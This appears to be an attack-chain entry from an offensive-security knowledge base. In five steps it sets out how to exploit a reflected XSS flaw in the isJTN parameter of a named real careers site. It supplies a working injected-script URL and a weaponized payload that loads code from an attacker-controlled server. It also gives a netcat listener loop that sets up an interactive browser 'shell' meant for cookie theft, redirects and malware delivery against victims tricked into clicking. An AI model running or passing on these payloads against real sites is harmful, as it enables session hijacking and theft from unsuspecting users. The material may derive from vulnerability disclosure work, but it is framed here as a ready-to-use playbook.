---
tags:
  - xss
  - reflected-xss
  - javascript
  - browser-exploitation
  - xss-shell
type: attack_chain
tools:
  - '[[tools/netcat]]'
tactics:
  - '[[Execution]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Identify-Reflected-XSS-in-isJTN-Parameter]]'
  - '[[procedures/Test-Basic-XSS-Payload-Execution]]'
  - '[[procedures/Weaponize-XSS-for-External-Script-Loading]]'
  - '[[procedures/Set-Up-Netcat-Listener-for-XSS-Shell]]'
  - '[[procedures/Establish-and-Interact-with-XSS-Shell]]'
step_count: 5
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:43.743Z'
description: >-
  A multi-stage attack exploiting a reflected XSS vulnerability in the isJTN
  parameter of the Informatica careers apply endpoint to achieve arbitrary
  JavaScript execution and establish an interactive XSS shell for persistent
  browser control.
skill_level: intermediate
impact_level: high
id: 8a7b46b5-7453-480d-9f63-3fda574e0eac
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Reflected XSS in isJTN Parameter Leading to Interactive XSS Shell

Multi-stage attack chain demonstrating exploitation of a reflected Cross-Site Scripting (XSS) vulnerability in the 'isJTN' parameter on the careers.informatica.com/apply endpoint to execute arbitrary JavaScript and establish an interactive XSS shell for stealing cookies, redirecting browsers, or delivering malware.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 5 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Identify Reflection] --> B[Test Basic Payload]
    B --> C[Weaponize for Script Load]
    C --> D[Set Up Listener]
    D --> E[Establish Shell]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#f39c12
    style D fill:#3498db
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/netcat]]

### Target Environment

- Web platform with Tomcat/Apache-Coyote/1.1 serving the /apply endpoint
- Port 443 (HTTPS) access to careers.informatica.com
- Attacker server with public IP and open port (e.g., 533)

### Initial Access Requirements

- No credentials needed; social engineering to trick victim into clicking malicious link
- Network access to target site and ability to host external script

## Detailed Attack Procedures

### Step 1: Identify Reflection
procedure: [[procedures/Identify-Reflected-XSS-in-isJTN-Parameter]]

**Objective**: Confirm that the 'isJTN' parameter is reflected unsanitized into the HTML response, enabling XSS.

**Instructions**: Inspect the /apply endpoint response for direct reflection of isJTN in JavaScript objects. Use browser dev tools or a proxy like Burp to analyze the HTML output.

**Expected Output**: Parameter value appears in var payload = { ... isJTN: 'user_input' ... } without encoding.

**Success Indicators**:
- Unsanitized reflection observed in response
- No validation or escaping applied to input

### Step 2: Test Basic XSS Payload
procedure: [[procedures/Test-Basic-XSS-Payload-Execution]]

**Objective**: Verify JavaScript execution by injecting a simple payload that triggers a browser alert.

**Instructions**: Craft a URL with URL-encoded payload: https://careers.informatica.com/apply?isJTN=%3Cscript%3Eprompt(%27ZephrFish%27)%3C/script%3E. Visit the link in a browser to decode and execute <script>prompt('ZephrFish')</script>.

**Expected Output**: Prompt box appears in the browser displaying 'ZephrFish'.

**Success Indicators**:
- Alert/prompt executes on page load
- Confirms arbitrary JS injection

### Step 3: Weaponize XSS Payload
procedure: [[procedures/Weaponize-XSS-for-External-Script-Loading]]

**Objective**: Modify the payload to load an external script from the attacker's server, enabling persistent control.

**Instructions**: Update the payload to <script>setInterval(function(){d=document;z=d.createElement("script");z.src="//AttackerServerIP:533";d.body.appendChild(z)},0)</script>, URL-encode it, and append to the URL: https://careers.informatica.com/apply?isJTN=[encoded_payload]. Victim visits to trigger script load.

**Expected Output**: Browser requests and executes script from attacker's IP:533.

**Success Indicators**:
- Network request to attacker server observed
- External script loaded and run

### Step 4: Set Up Listener
procedure: [[procedures/Set-Up-Netcat-Listener-for-XSS-Shell]]

**Objective**: Prepare the attacker's server to receive connections and send JS commands interactively.

**Instructions**: Run the netcat listener loop on attacker machine using [[commands/netcat-xss-shell-listener]]:

```bash
while :; do printf "ZephrFishHackerOne>$ "; read c; echo $c | nc -vvlp 533 >/dev/null; done
```

**Expected Output**: Prompt 'ZephrFishHackerOne>$ ' appears, ready for input.

**Success Indicators**:
- Listener active on port 533
- Ready to handle incoming browser connections

### Step 5: Establish Shell
procedure: [[procedures/Establish-and-Interact-with-XSS-Shell]]

**Objective**: Trick victim into visiting the link to connect the shell, then send JS commands for control.

**Instructions**: Victim clicks malicious link, triggering connection to listener. Use [[commands/javascript-alert-shell-test]] to send 'alert('Shell')' via netcat input.

**Expected Output**: Victim's browser shows 'Shell' alert; connection logs show 'connect to [IP] from [victim] sent 15, rcvd 245'.

**Success Indicators**:
- Interactive JS execution confirmed
- Commands like cookie theft or redirects possible

## Attack Chain Summary

### Key Achievements

1. Confirmed reflected XSS in isJTN parameter without sanitization
2. Executed arbitrary JS via crafted URLs
3. Established persistent XSS shell using external script loading and netcat
4. Demonstrated interactive control for data exfiltration or malware

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[JavaScript]]

### MITRE ATT&CK Tactics

- [[Execution]]

---

*Last updated: 2023-10-01T00:00:00Z*
